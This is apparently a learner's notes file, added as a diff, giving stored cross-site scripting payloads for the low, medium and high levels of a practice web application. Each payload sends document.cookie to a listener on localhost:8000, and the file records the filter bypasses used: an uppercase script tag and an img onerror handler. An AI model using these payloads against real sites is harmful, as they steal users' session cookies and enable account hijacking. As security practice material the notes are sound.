@@ -1,0 +1,18 @@
+Low
+    <script>fetch('http://localhost:8000/'+document.cookie)</script>
+    Edit limit from input
+
+    Should actually have 
+        <script>window.location="www.google.com"</script>
+        But not done because will keep redirecting
+
+Medium
+    <SCRIPT>fetch('http://localhost:8000/'+document.cookie)</script>
+    in Name 
+
+    Doesn't work in message 
+    and <scr<script>ipt> doesn't work
+
+High
+    <img src/onerror="fetch('http://localhost:8000/'+document.cookie)">
+    In Name
